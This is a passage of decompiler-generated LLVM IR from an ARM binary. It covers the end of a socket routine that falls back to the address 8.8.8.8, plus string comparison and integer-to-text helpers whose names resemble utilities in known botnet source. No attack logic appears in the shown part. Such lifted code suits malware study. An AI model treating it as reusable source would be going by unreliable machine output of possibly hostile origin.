  %v1_127cc = call i32 @__GI___libc_close(i32 %v0_127c8)
  br label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %bb, %dec_label_pc_12788
  %storemerge = phi i32 [ 134744072, %dec_label_pc_12788 ], [ %v1_12780, %bb ]
  store i32 %v3_1274c, i32* @r4, align 4
  store i32 %v6_1274c, i32* @r5, align 4
  store i32 %v9_1274c, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_12794, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12774, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 17, 18, 15, 16, 2, 1, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_127d4, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_127e4 = load i8, i8* %tmp, align 1
  %v4_127e4 = zext i8 %v3_127e4 to i32
  store i32 %v4_127e4, i32* @r3, align 4
  %v2_127e8 = icmp eq i8 %v3_127e4, 0
  br i1 %v2_127e8, label %bb, label %dec_label_pc_127fc

bb:                                               ; preds = %entry
  br label %dec_label_pc_12810

dec_label_pc_127fc:                               ; preds = %entry
  br label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %dec_label_pc_12800, %dec_label_pc_127fc
  %v0_12800 = phi i32 [ %v1_12800, %dec_label_pc_12800 ], [ 0, %dec_label_pc_127fc ]
  %v1_12800 = add i32 %v0_12800, 1
  %v2_12804 = add i32 %v1_12800, %arg2
  %v3_12804 = inttoptr i32 %v2_12804 to i8*
  %v4_12804 = load i8, i8* %v3_12804, align 1
  %v6_12804 = zext i8 %v4_12804 to i32
  store i32 %v6_12804, i32* @r3, align 4
  %v2_12808 = icmp eq i8 %v4_12804, 0
  br i1 %v2_12808, label %dec_label_pc_12810, label %dec_label_pc_12800

dec_label_pc_12810:                               ; preds = %dec_label_pc_12800, %bb
  %v0_1285421 = phi i32 [ %v4_127e4, %bb ], [ %v1_12800, %dec_label_pc_12800 ]
  %v0_128182 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_128182, 1
  br i1 %tmp29, label %dec_label_pc_12868, label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_12810, %dec_label_pc_12818.backedge
  %v0_1281c.in = phi i32 [ %v0_1281c, %dec_label_pc_12818.backedge ], [ %v0_128182, %dec_label_pc_12810 ]
  %v1_12830 = phi i32 [ %v1_1283015, %dec_label_pc_12818.backedge ], [ 0, %dec_label_pc_12810 ]
  %v0_12824 = phi i32 [ %v5_12824, %dec_label_pc_12818.backedge ], [ %tmp23, %dec_label_pc_12810 ]
  %v0_1281c = add i32 %v0_1281c.in, -1
  %v1_12824 = inttoptr i32 %v0_12824 to i8*
  %v2_12824 = load i8, i8* %v1_12824, align 1
  %v3_12824 = zext i8 %v2_12824 to i32
  store i32 %v3_12824, i32* @ip, align 4
  %v5_12824 = add i32 %v0_12824, 1
  %v1_12828 = add nsw i32 %v3_12824, -65
  %v2_12830 = add i32 %v1_12830, %arg2
  %v3_12830 = inttoptr i32 %v2_12830 to i8*
  %v4_12830 = load i8, i8* %v3_12830, align 1
  %v6_12830 = zext i8 %v4_12830 to i32
  store i32 %v6_12830, i32* @r3, align 4
  %v1_12834 = add nsw i32 %v6_12830, -65
  %tmp38 = icmp ult i32 %v1_12828, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_12824
  %v5_12838 = or i32 %v3_12824, 96
  store i32 %v5_12838, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_12824, %bb30
  %v0_12844 = phi i32 [ %v3_12824, %dec_label_pc_12824 ], [ %v5_12838, %bb30 ]
  %tmp39 = icmp ult i32 %v1_12834, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_12840 = or i32 %v6_12830, 96
  store i32 %v5_12840, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_12844 = phi i32 [ %v6_12830, %bb31 ], [ %v5_12840, %bb32 ]
  %v9_12844 = icmp eq i32 %v0_12844, %v1_12844
  br i1 %v9_12844, label %dec_label_pc_12850, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_12818.backedge

dec_label_pc_12818.backedge:                      ; preds = %bb34, %dec_label_pc_12850
  %v1_1283015 = phi i32 [ 0, %bb34 ], [ %v1_12850, %dec_label_pc_12850 ]
  %tmp35 = icmp slt i32 %v0_1281c, 1
  br i1 %tmp35, label %dec_label_pc_12868, label %dec_label_pc_12824

dec_label_pc_12850:                               ; preds = %bb33
  %v1_12850 = add i32 %v1_12830, 1
  %v9_12854 = icmp eq i32 %v0_1285421, %v1_12850
  br i1 %v9_12854, label %dec_label_pc_1285c, label %dec_label_pc_12818.backedge

dec_label_pc_1285c:                               ; preds = %dec_label_pc_12850
  %v2_1285c = sub i32 %v5_12824, %tmp23
  br label %dec_label_pc_12868

dec_label_pc_12868:                               ; preds = %dec_label_pc_12818.backedge, %dec_label_pc_12810, %dec_label_pc_1285c
  %storemerge = phi i32 [ %v2_1285c, %dec_label_pc_1285c ], [ -1, %dec_label_pc_12810 ], [ -1, %dec_label_pc_12818.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12850, { 1, 0 }
  uselistorder i32 %v0_12824, { 1, 0 }
  uselistorder i32 %v1_12830, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_12868, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12818.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_12824, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12870 = load i8, i8* %arg1, align 1
  %v2_12874 = icmp eq i8 %v2_12870, 0
  br i1 %v2_12874, label %bb, label %dec_label_pc_12880

bb:                                               ; preds = %entry
  %v3_12870 = zext i8 %v2_12870 to i32
  br label %dec_label_pc_12894

dec_label_pc_12880:                               ; preds = %entry
  br label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_12884, %dec_label_pc_12880
  %v0_12884 = phi i32 [ %v1_12884, %dec_label_pc_12884 ], [ 0, %dec_label_pc_12880 ]
  %v1_12884 = add i32 %v0_12884, 1
  %v2_12888 = add i32 %v1_12884, %tmp
  %v3_12888 = inttoptr i32 %v2_12888 to i8*
  %v4_12888 = load i8, i8* %v3_12888, align 1
  %v2_1288c = icmp eq i8 %v4_12888, 0
  br i1 %v2_1288c, label %dec_label_pc_12894, label %dec_label_pc_12884

dec_label_pc_12894:                               ; preds = %dec_label_pc_12884, %bb
  %v0_128e03 = phi i32 [ %v3_12870, %bb ], [ %v1_12884, %dec_label_pc_12884 ]
  %v1_12894 = inttoptr i32 %arg2 to i8*
  %v2_12894 = load i8, i8* %v1_12894, align 1
  %v2_12898 = icmp eq i8 %v2_12894, 0
  br i1 %v2_12898, label %bb21, label %dec_label_pc_128a4

bb21:                                             ; preds = %dec_label_pc_12894
  %v3_12894 = zext i8 %v2_12894 to i32
  br label %dec_label_pc_128b8

dec_label_pc_128a4:                               ; preds = %dec_label_pc_12894
  br label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %dec_label_pc_128a8, %dec_label_pc_128a4
  %v0_128a8 = phi i32 [ %v1_128a8, %dec_label_pc_128a8 ], [ 0, %dec_label_pc_128a4 ]
  %v1_128a8 = add i32 %v0_128a8, 1
  %v2_128ac = add i32 %v1_128a8, %arg2
  %v3_128ac = inttoptr i32 %v2_128ac to i8*
  %v4_128ac = load i8, i8* %v3_128ac, align 1
  %v2_128b0 = icmp eq i8 %v4_128ac, 0
  br i1 %v2_128b0, label %dec_label_pc_128b8, label %dec_label_pc_128a8

dec_label_pc_128b8:                               ; preds = %dec_label_pc_128a8, %bb21
  %v0_128b8 = phi i32 [ %v3_12894, %bb21 ], [ %v1_128a8, %dec_label_pc_128a8 ]
  %v9_128b8 = icmp eq i32 %v0_128b8, %v0_128e03
  br i1 %v9_128b8, label %dec_label_pc_128e0.preheader, label %dec_label_pc_128c0

dec_label_pc_128e0.preheader:                     ; preds = %dec_label_pc_128b8
  %v2_128e05 = icmp eq i32 %v0_128e03, 0
  br i1 %v2_128e05, label %dec_label_pc_128e8, label %dec_label_pc_128c8

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128c8, %dec_label_pc_128b8
  ret i32 0

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128d8, %dec_label_pc_128e0.preheader
  %v0_128e0.in = phi i32 [ %v0_128e0, %dec_label_pc_128d8 ], [ %v0_128e03, %dec_label_pc_128e0.preheader ]
  %v0_128dc = phi i32 [ %v1_128dc, %dec_label_pc_128d8 ], [ %arg2, %dec_label_pc_128e0.preheader ]
  %v0_128d8 = phi i32 [ %v1_128d8, %dec_label_pc_128d8 ], [ %tmp, %dec_label_pc_128e0.preheader ]
  %v0_128e0 = add i32 %v0_128e0.in, -1
  %v1_128c8 = inttoptr i32 %v0_128d8 to i8*
  %v2_128c8 = load i8, i8* %v1_128c8, align 1
  %v1_128cc = inttoptr i32 %v0_128dc to i8*
  %v2_128cc = load i8, i8* %v1_128cc, align 1
  %v9_128d0 = icmp eq i8 %v2_128c8, %v2_128cc
  br i1 %v9_128d0, label %dec_label_pc_128d8, label %dec_label_pc_128c0

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128c8
  %v1_128d8 = add i32 %v0_128d8, 1
  %v1_128dc = add i32 %v0_128dc, 1
  %v2_128e0 = icmp eq i32 %v0_128e0, 0
  br i1 %v2_128e0, label %dec_label_pc_128e8, label %dec_label_pc_128c8

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128d8, %dec_label_pc_128e0.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_12894, { 1, 0 }
  uselistorder i8 %v2_12870, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_128f4 = load i8, i8* %arg1, align 1
  %v2_128f8 = icmp eq i8 %v2_128f4, 0
  %v0_128fc = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_128f8, label %bb, label %dec_label_pc_12908

bb:                                               ; preds = %entry
  %v3_128f4 = zext i8 %v2_128f4 to i32
  br label %dec_label_pc_1291c

dec_label_pc_12908:                               ; preds = %entry
  br label %dec_label_pc_1290c

dec_label_pc_1290c:                               ; preds = %dec_label_pc_1290c, %dec_label_pc_12908
  %v0_1290c = phi i32 [ %v1_1290c, %dec_label_pc_1290c ], [ 0, %dec_label_pc_12908 ]
  %v1_1290c = add i32 %v0_1290c, 1
  %v2_12910 = add i32 %v1_1290c, %tmp
  %v3_12910 = inttoptr i32 %v2_12910 to i8*
  %v4_12910 = load i8, i8* %v3_12910, align 1
  %v2_12914 = icmp eq i8 %v4_12910, 0
  br i1 %v2_12914, label %dec_label_pc_1291c, label %dec_label_pc_1290c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_1290c, %bb
  %v6_12944 = phi i32 [ %v3_128f4, %bb ], [ %v1_1290c, %dec_label_pc_1290c ]
  %v0_1291c = load i32, i32* %r1.global-to-local, align 4
  %v1_1291c = inttoptr i32 %v0_1291c to i8*
  %v2_1291c = load i8, i8* %v1_1291c, align 1
  %v3_1291c = zext i8 %v2_1291c to i32
  %v2_12920 = icmp eq i8 %v2_1291c, 0
  br i1 %v2_12920, label %bb26, label %dec_label_pc_1292c

bb26:                                             ; preds = %dec_label_pc_1291c
  store i32 %v3_1291c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12940

dec_label_pc_1292c:                               ; preds = %dec_label_pc_1291c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12930

dec_label_pc_12930:                               ; preds = %dec_label_pc_12930, %dec_label_pc_1292c
  %v0_12930 = phi i32 [ %v1_12930, %dec_label_pc_12930 ], [ 0, %dec_label_pc_1292c ]
  %v1_12930 = add i32 %v0_12930, 1
  store i32 %v1_12930, i32* %r2.global-to-local, align 4
  %v2_12934 = add i32 %v1_12930, %v0_1291c
  %v3_12934 = inttoptr i32 %v2_12934 to i8*
  %v4_12934 = load i8, i8* %v3_12934, align 1
  %v2_12938 = icmp eq i8 %v4_12934, 0
  br i1 %v2_12938, label %dec_label_pc_12940, label %dec_label_pc_12930

dec_label_pc_12940:                               ; preds = %dec_label_pc_12930, %bb26
  %v0_12940 = phi i32 [ %v3_1291c, %bb26 ], [ %v1_12930, %dec_label_pc_12930 ]
  %v2_12940 = sub i32 %v0_12940, %v0_128fc
  %v4_12940 = xor i32 %v0_12940, %v0_128fc
  %v5_12940 = xor i32 %v2_12940, %v0_12940
  %v6_12940 = and i32 %v5_12940, %v4_12940
  %v5_12944 = icmp slt i32 %v0_12940, %v0_128fc
  br i1 %v5_12944, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_12940
  %v8_12944 = sub i32 %v6_12944, %v0_128fc
  %v10_12944 = xor i32 %v6_12944, %v0_128fc
  %v11_12944 = xor i32 %v8_12944, %v6_12944
  %v12_12944 = and i32 %v11_12944, %v10_12944
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12940, %bb27
  %v1_12948.in = phi i32 [ %v6_12940, %dec_label_pc_12940 ], [ %v12_12944, %bb27 ]
  %v0_12948.in = phi i32 [ %v2_12940, %dec_label_pc_12940 ], [ %v8_12944, %bb27 ]
  %v0_12948 = icmp slt i32 %v0_12948.in, 0
  %v1_12948 = icmp slt i32 %v1_12948.in, 0
  %v2_12948 = xor i1 %v1_12948, %v0_12948
  br i1 %v2_12948, label %dec_label_pc_12974, label %dec_label_pc_12958.preheader

dec_label_pc_12958.preheader:                     ; preds = %bb28
  %v2_129585 = icmp eq i32 %v0_128fc, 0
  br i1 %v2_129585, label %dec_label_pc_12974, label %dec_label_pc_12960

dec_label_pc_12950:                               ; preds = %dec_label_pc_12960
  %v1_12950 = add i32 %v0_12950, 1
  %v1_12954 = add i32 %v0_12954, 1
  store i32 %v1_12954, i32* %r1.global-to-local, align 4
  %v2_12958 = icmp eq i32 %v0_12958, 0
  br i1 %v2_12958, label %dec_label_pc_12974, label %dec_label_pc_12960

dec_label_pc_12960:                               ; preds = %dec_label_pc_12950, %dec_label_pc_12958.preheader
  %v0_12958.in = phi i32 [ %v0_12958, %dec_label_pc_12950 ], [ %v0_128fc, %dec_label_pc_12958.preheader ]
  %v0_12954 = phi i32 [ %v1_12954, %dec_label_pc_12950 ], [ %v0_1291c, %dec_label_pc_12958.preheader ]
  %v0_12950 = phi i32 [ %v1_12950, %dec_label_pc_12950 ], [ %tmp, %dec_label_pc_12958.preheader ]
  %v0_12958 = add i32 %v0_12958.in, -1
  %v1_12960 = inttoptr i32 %v0_12950 to i8*
  %v2_12960 = load i8, i8* %v1_12960, align 1
  %v3_12960 = zext i8 %v2_12960 to i32
  store i32 %v3_12960, i32* %r2.global-to-local, align 4
  %v1_12964 = inttoptr i32 %v0_12954 to i8*
  %v2_12964 = load i8, i8* %v1_12964, align 1
  %v9_12968 = icmp eq i8 %v2_12960, %v2_12964
  br i1 %v9_12968, label %dec_label_pc_12950, label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %dec_label_pc_12950, %dec_label_pc_12958.preheader, %dec_label_pc_12960, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_12958.preheader ], [ 1, %dec_label_pc_12950 ], [ 0, %dec_label_pc_12960 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_12950, { 1, 0 }
  uselistorder i32 %v0_12954, { 1, 0 }
  uselistorder i32 %v0_12940, { 3, 0, 1, 2 }
  uselistorder i32 %v1_12930, { 0, 1, 3, 2 }
  uselistorder i32 %v0_128fc, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_128f4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12974, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_12988 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12988, i32* %r8.global-to-local, align 4
  %v2_12988 = icmp eq i32 %v0_12988, 0
  store i1 %v2_12988, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_12988, label %dec_label_pc_12a68, label %dec_label_pc_12998

dec_label_pc_12998:                               ; preds = %entry
  %v3_12998 = icmp eq i8 %arg1, 0
  store i1 %v3_12998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12998, label %.thread, label %dec_label_pc_129ac

.thread:                                          ; preds = %dec_label_pc_12998
  %v4_129a0 = inttoptr i32 %v0_12988 to i8*
  store i8 48, i8* %v4_129a0, align 1
  %v0_129a4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129a4.pr.pr, label %.thread1, label %dec_label_pc_129ac

.thread1:                                         ; preds = %.thread
  %v4_129a4 = load i32, i32* %r8.global-to-local, align 4
  %v5_129a4 = add i32 %v4_129a4, 1
  %v6_129a4 = inttoptr i32 %v5_129a4 to i8*
  store i8 0, i8* %v6_129a4, align 1
  %v0_129a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129a8.pr.pr, label %dec_label_pc_12a68, label %dec_label_pc_129ac

dec_label_pc_129ac:                               ; preds = %dec_label_pc_12998, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_129b0 = icmp eq i32 %arg2, 10
  store i1 %v7_129b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129b0, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_129ac
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_129ac
  %v4_129ac = zext i1 %tmp48 to i32
  store i32 %v4_129ac, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_129d08 = sub nsw i32 0, %tmp
  %tmp.v3_129d08 = select i1 %phitmp, i32 %tmp, i32 %v3_129d08
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_129d08, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_129dc = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_129dc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %bb46, %.thread6
  %v2_12a00 = phi i32 [ %v1_12a0c, %bb46 ], [ 32, %.thread6 ]
  %v0_129f4 = phi i32 [ %v2_12a04, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_129e4 = load i32, i32* %r6.global-to-local, align 4
  %v3_129e8 = urem i32 %v0_129f4, %v0_129e4
  store i32 %v3_129e8, i32* %r1.global-to-local, align 4
  %v7_129ec = icmp eq i32 %v3_129e8, 9
  store i1 %v7_129ec, i1* %cpsr_z.global-to-local, align 1
  %v1_129f0 = add i32 %v3_129e8, 48
  store i32 %v0_129f4, i32* %r0.global-to-local, align 4
  %v7_129f8 = icmp sgt i32 %v3_129e8, 9
  %extract.t = trunc i32 %v1_129f0 to i8
  br i1 %v7_129f8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_129e0
  %v9_129f8 = add i32 %v3_129e8, 55
  %extract.t28 = trunc i32 %v9_129f8 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_129e0, %bb45
  %v0_12a00.off0 = phi i8 [ %extract.t, %dec_label_pc_129e0 ], [ %extract.t28, %bb45 ]
  store i32 %v0_129e4, i32* %r1.global-to-local, align 4
  %v3_12a00 = load i32, i32* %r7.global-to-local, align 4
  %v4_12a00 = add i32 %v3_12a00, %v2_12a00
  %v5_12a00 = inttoptr i32 %v4_12a00 to i8*
  store i8 %v0_12a00.off0, i8* %v5_12a00, align 1
  %v0_12a04 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a04 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a04 = udiv i32 %v0_12a04, %v1_12a04
  store i32 %v2_12a04, i32* %r0.global-to-local, align 4
  %v2_12a08 = icmp ugt i32 %v1_12a04, %v0_12a04
  store i1 %v2_12a08, i1* %cpsr_z.global-to-local, align 1
  %v0_12a0c = load i32, i32* %r5.global-to-local, align 4
  %v1_12a0c = add i32 %v0_12a0c, -1
  store i32 %v1_12a0c, i32* %r5.global-to-local, align 4
  br i1 %v2_12a08, label %dec_label_pc_12a14, label %dec_label_pc_129e0

dec_label_pc_12a14:                               ; preds = %bb46
  %v0_12a14 = load i32, i32* %sl.global-to-local, align 4
  %v2_12a14 = icmp eq i32 %v0_12a14, 0
  store i1 %v2_12a14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a14, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12a14
  %v3_12a18 = ptrtoint i32* %stack_var_-32 to i32
  %v3_12a1c = add i32 %v1_12a0c, %v3_12a18
  store i32 %v3_12a1c, i32* %r2.global-to-local, align 4
  %v4_12a24 = add i32 %v3_12a1c, -34
  %v5_12a24 = inttoptr i32 %v4_12a24 to i8*
  store i8 45, i8* %v5_12a24, align 1
  %v0_12a28.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_12a28.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_12a28.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_12a14
  %v1_12a28 = phi i32 [ %v1_12a0c, %dec_label_pc_12a14 ], [ %v1_12a28.pre, %.thread11 ]
  %v2_12a28 = add i32 %v1_12a28, 1
  store i32 %v2_12a28, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_12a34 = phi i32 [ %v2_12a28, %.thread12 ], [ %v1_12a28.pre, %.thread11 ]
  %v0_12a2c = load i32, i32* %r7.global-to-local, align 4
  %v2_12a2c = add i32 %v0_12a2c, %v1_12a34
  %v3_12a2c = inttoptr i32 %v2_12a2c to i8*
  %v4_12a2c = load i8, i8* %v3_12a2c, align 1
  %v6_12a2c = zext i8 %v4_12a2c to i32
  %v2_12a30 = icmp eq i8 %v4_12a2c, 0
  store i1 %v2_12a30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12a2c, i32* %r2.global-to-local, align 4
  br i1 %v2_12a30, label %dec_label_pc_12a78, label %dec_label_pc_12a40.preheader

dec_label_pc_12a40.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a40.preheader, %dec_label_pc_12a40
  %v0_12a40 = phi i32 [ 0, %dec_label_pc_12a40.preheader ], [ %v1_12a40, %dec_label_pc_12a40 ]
  %v1_12a40 = add i32 %v0_12a40, 1
  store i32 %v1_12a40, i32* %r1.global-to-local, align 4
  %v2_12a44 = add i32 %v1_12a40, %v2_12a2c
  %v3_12a44 = inttoptr i32 %v2_12a44 to i8*
  %v4_12a44 = load i8, i8* %v3_12a44, align 1
  %v2_12a48 = icmp eq i8 %v4_12a44, 0
  store i1 %v2_12a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a48, label %dec_label_pc_12a50, label %dec_label_pc_12a40

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a40, %dec_label_pc_12a78
  %v0_12a5425 = phi i32 [ %v6_12a2c, %dec_label_pc_12a78 ], [ %v1_12a40, %dec_label_pc_12a40 ]
  %v0_12a50 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12a50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a54

dec_label_pc_12a54:                               ; preds = %dec_label_pc_12a54.dec_label_pc_12a54_crit_edge, %dec_label_pc_12a50
  %v2_12a60 = phi i32 [ %v5_12a60, %dec_label_pc_12a54.dec_label_pc_12a54_crit_edge ], [ %v0_12a50, %dec_label_pc_12a50 ]
  %v0_12a58 = phi i32 [ %v0_12a58.pre, %dec_label_pc_12a54.dec_label_pc_12a54_crit_edge ], [ %v2_12a2c, %dec_label_pc_12a50 ]
  %v0_12a54 = phi i32 [ %v0_12a54.pre, %dec_label_pc_12a54.dec_label_pc_12a54_crit_edge ], [ %v0_12a5425, %dec_label_pc_12a50 ]
  %v1_12a54 = add i32 %v0_12a54, -1
  store i32 %v1_12a54, i32* %r1.global-to-local, align 4
  %v1_12a58 = inttoptr i32 %v0_12a58 to i8*
  %v2_12a58 = load i8, i8* %v1_12a58, align 1
  %v5_12a58 = add i32 %v0_12a58, 1
  store i32 %v5_12a58, i32* %r2.global-to-local, align 4
  %v3_12a5c = icmp eq i32 %v0_12a54, 0
  store i1 %v3_12a5c, i1* %cpsr_z.global-to-local, align 1
  %v3_12a60 = inttoptr i32 %v2_12a60 to i8*
  store i8 %v2_12a58, i8* %v3_12a60, align 1
  %v4_12a60 = load i32, i32* %r0.global-to-local, align 4
  %v5_12a60 = add i32 %v4_12a60, 1
  store i32 %v5_12a60, i32* %r0.global-to-local, align 4
  br i1 %v3_12a5c, label %dec_label_pc_12a68, label %dec_label_pc_12a54.dec_label_pc_12a54_crit_edge

dec_label_pc_12a54.dec_label_pc_12a54_crit_edge:  ; preds = %dec_label_pc_12a54
  %v0_12a54.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_12a58.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12a54

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12a54, %.thread1, %entry
  %v0_12a68 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12a68, i32* %r0.global-to-local, align 4
  ret i32 %v0_12a68

dec_label_pc_12a78:                               ; preds = %.thread11._crit_edge
  store i32 %v6_12a2c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12a50

; uselistorder directives
  uselistorder i32 %v5_12a60, { 1, 0 }
  uselistorder i1 %v3_12a5c, { 1, 0 }
  uselistorder i32 %v0_12a58, { 1, 0 }
  uselistorder i32 %v1_12a40, { 0, 1, 3, 2 }
  uselistorder i32 %v6_12a2c, { 1, 0 }
  uselistorder i32 %v2_12a2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12a28.pre, { 1, 0 }
  uselistorder i32 %v1_12a0c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12a04, { 1, 0 }
  uselistorder i32 %v3_129e8, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_12988, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 6, 0, 5, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_12a50, { 1, 0 }
  uselistorder label %dec_label_pc_12a40, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_129ac, { 2, 1, 0 }
}

